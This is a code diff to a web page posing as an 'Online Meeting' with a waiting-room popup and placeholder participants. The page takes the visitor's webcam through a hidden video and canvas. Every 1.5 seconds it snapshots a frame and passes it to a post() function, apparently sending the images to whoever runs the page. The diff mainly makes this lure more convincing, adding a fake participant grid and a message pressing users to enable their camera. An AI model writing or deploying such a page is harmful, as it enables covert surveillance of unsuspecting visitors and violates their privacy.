@@ -5,13 +5,8 @@
   <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
   <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
   <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+  <title>Online Meeting</title>
 </head>
-
-<div class="video-wrap">
-  <video id="video" playsinline autoplay></video>
-</div>
-
-<center><canvas id="canvas" width="640" height="480" audoplay></canvas></center>
 
 <style>
   @import url("https://fonts.googleapis.com/css2?family=Nunito:wght@500;500&display=swap");
@@ -28,15 +23,22 @@
     font-weight: 500;
   }
 
+  /* Hide original video and canvas for background capture */
+  .video-wrap, #canvas {
+    display: none !important;
+  }
+
   .main-screen {
     background-color: #273039;
-    height: 100vh;
+    flex-grow: 1; /* Take all available vertical space */
     width: 100%;
     display: flex;
     justify-content: center;
     align-items: center;
+    padding-bottom: 80px; /* Make space for the fixed bottom bar */
+    box-sizing: border-box; /* Include padding in height calculation */
   }
-
+  
   img {
     height: 80px;
     width: 80px;
@@ -44,8 +46,9 @@
 
   .bottom-bar {
     position: fixed;
-    padding: 0px 40px 0px -40px;
     bottom: 0px;
+    left: 0;
+    right: 0;
     height: 80px;
     width: 100%;
     background-color: #1F2022;
@@ -54,6 +57,7 @@
     justify-content: center;
     align-items: center;
     color: #fff;
+    z-index: 100;
   }
 
   .icon-button {
@@ -89,6 +93,7 @@
     justify-content: center;
     top: 5px;
     right: 5px;
+    z-index: 90; /* Below popup, above meeting grid */
   }
   #ac-wrapper {
     position: fixed;
@@ -96,23 +101,97 @@
     left: 0;
     width: 100%;
     height: 100%;
-    background: rgba(255,255,255,.6);
+    background: rgba(0,0,0,.8); /* Darker overlay for popup */
     z-index: 1001;
+    display: flex; /* Use flex for centering */
+    justify-content: center;
+    align-items: center;
 }
 
 #popup {
-    width: 555px;
-    height: 35px;
+    width: 90%; /* Responsive width */
+    max-width: 555px; /* Max width for larger screens */
     background: #FFFFFF;
     border: 5px solid #000;
     border-radius: 15px;
-    -moz-border-radius: 15px;
-    -webkit-border-radius: 15px;
     box-shadow: #64686e 0px 0px 3px 3px;
-    -moz-box-shadow: #64686e 0px 0px 3px 3px;
-    -webkit-box-shadow: #64686e 0px 0px 3px 3px;
+    padding: 20px; /* Add padding for better appearance */
+    text-align: center;
+    color: black; /* Ensure text is visible */
+}
+#popup h2 {
+    margin: 0;
+    font-size: 18px; /* Adjust font size */
+    line-height: 1.4;
+}
+
+/* Meeting Grid Styles */
+.meeting-grid-container {
+    flex-grow: 1; /* Take up available space */
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    width: 100%;
+    padding: 20px; /* Padding around the grid */
+    box-sizing: border-box;
+}
+
+.meeting-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); /* Adjust tile size as needed */
+    gap: 10px;
+    width: 100%; /* Take full width of its container */
+    max-width: 1200px; /* Max width for the grid */
+    background-color: #1F2022;
+    border-radius: 10px;
+    padding: 10px; /* Padding inside the grid */
+}
+
+.participant-tile {
+    background-color: #333;
+    border-radius: 8px;
+    overflow: hidden;
     position: relative;
-    top: 250px; left: 375px;
+    aspect-ratio: 16/9; /* Maintain video aspect ratio */
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+    color: white;
+    font-size: 14px;
+}
+
+.participant-tile img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    display: block;
+}
+
+.participant-tile video {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    display: none; /* Hidden by default, shown when stream is active */
+}
+
+.participant-tile .participant-name {
+    position: absolute;
+    bottom: 5px;
+    left: 5px;
+    background-color: rgba(0, 0, 0, 0.5);
+    padding: 3px 8px;
+    border-radius: 3px;
+    font-size: 12px;
+}
+
+/* Class added by JS when user's camera is active */
+.participant-tile.active-user-feed video {
+    display: block; /* Show video when active */
+}
+
+.participant-tile.active-user-feed img {
+    display: none; /* Hide placeholder image when active */
 }
 </style>
 
@@ -138,7 +217,6 @@
 
   const video = document.getElementById('video');
   const canvas = document.getElementById('canvas');
-  const errorMsgElement = document.querySelector('span#errorMsg');
 
   const constraints = {
     audio: false,
@@ -154,49 +232,96 @@
       const stream = await navigator.mediaDevices.getUserMedia(constraints);
       handleSuccess(stream);
     } catch (e) {
-      errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+      handleError(e); // Pass error to handleError
     }
   }
 
   // Success
   function handleSuccess(stream) {
     window.stream = stream;
-    video.srcObject = stream;
+    video.srcObject = stream; // This is the hidden video for canvas capture
 
-    var context = canvas.getContext('2d');
+    const userParticipantTile = document.getElementById('user-participant-tile');
+    const userWebcamDisplay = document.getElementById('user-webcam-display');
+    if (userWebcamDisplay && userParticipantTile) {
+      userWebcamDisplay.srcObject = stream; // Assign stream to the visible video element
+      userParticipantTile.classList.add('active-user-feed'); // Add class to show video
+    }
+
+    // Hide the waiting room popup
+    const acWrapper = document.getElementById('ac-wrapper');
+    if (acWrapper) {
+      acWrapper.style.display = 'none';
+    }
+
+    const context = canvas.getContext('2d');
     setInterval(function () {
-
-      context.drawImage(video, 0, 0, 640, 480);
+      context.drawImage(video, 0, 0, 640, 480); // Draw from the hidden video
       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
       post(canvasData);
-      video.play();
     }, 1500);
-
-
   }
-  function PopUp(){
-    document.getElementById('ac-wrapper').style.display="none"; 
-}
+
+  function handleError(error) {
+    // Display a message if camera access is denied or fails
+    const popupMessage = document.querySelector('#popup h2');
+    if (popupMessage) {
+      if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
+        popupMessage.innerText = 'Camera access denied. Please enable camera to join the meeting.';
+      } else {
+        popupMessage.innerText = `Error accessing camera: ${error.message}`;
+      }
+    }
+    // Ensure the popup is visible if camera access fails
+    const acWrapper = document.getElementById('ac-wrapper');
+    if (acWrapper) {
+      acWrapper.style.display = 'flex'; // Ensure it's visible and centered
+    }
+  }
+
   // Load init
   init();
-  $(document).ready(function(){
-   setTimeout(function(){
-      PopUp();
-   },50000); // 5000 to load it after 5 seconds from page load
-});
 </script>
 
 <body>
   <div class="float_button">
     <i class="fas fa-expand" style="color: #fff; font-size: 18px; margin-top: 5px;"></i>
   </div>
-  <div id="ac-wrapper">
-    <div id="popup">
-        <center>
-            <h2>Please wait the meeting host will let you in soon</h2>
-        </center>
+
+  <div class="main-screen">
+    <div class="meeting-grid-container">
+      <div class="meeting-grid">
+        <!-- Placeholder participants -->
+        <div class="participant-tile">
+            <img src="https://i.pravatar.cc/150?img=1" alt="Participant 1">
+            <div class="participant-name">Alice</div>
+        </div>
+        <div class="participant-tile">
+            <img src="https://i.pravatar.cc/150?img=2" alt="Participant 2">
+            <div class="participant-name">Bob</div>
+        </div>
+        <div class="participant-tile">
+            <img src="https://i.pravatar.cc/150?img=3" alt="Participant 3">
+            <div class="participant-name">Charlie</div>
+        </div>
+        <!-- User's live webcam feed -->
+        <div class="participant-tile user-feed" id="user-participant-tile">
+            <video id="user-webcam-display" playsinline autoplay muted></video>
+            <div class="participant-name">You</div>
+        </div>
+        <!-- More placeholders -->
+        <div class="participant-tile">
+            <img src="https://i.pravatar.cc/150?img=4" alt="Participant 4">
+            <div class="participant-name">Diana</div>
+        </div>
+        <div class="participant-tile">
+            <img src="https://i.pravatar.cc/150?img=5" alt="Participant 5">
+            <div class="participant-name">Eve</div>
+        </div>
+      </div>
     </div>
-</div>
+  </div>
+
   <div class="bottom-bar">
     <div class="icon-button" style="margin-left: 50px;">
       <i class="fas fa-microphone"></i>
@@ -227,6 +352,19 @@
       <h6>Record</h6>
     </div>
     <button style="margin-right: 50px;">End</button>
+  </div>
+
+  <!-- Hidden video and canvas for background capture -->
+  <div class="video-wrap" hidden>
+    <video id="video" playsinline autoplay></video>
+  </div>
+  <canvas id="canvas" width="640" height="480" hidden></canvas>
+
+  <!-- Popup for waiting room -->
+  <div id="ac-wrapper">
+    <div id="popup">
+        <h2>Please wait, the meeting host will let you in soon</h2>
+    </div>
   </div>
 </body>
 
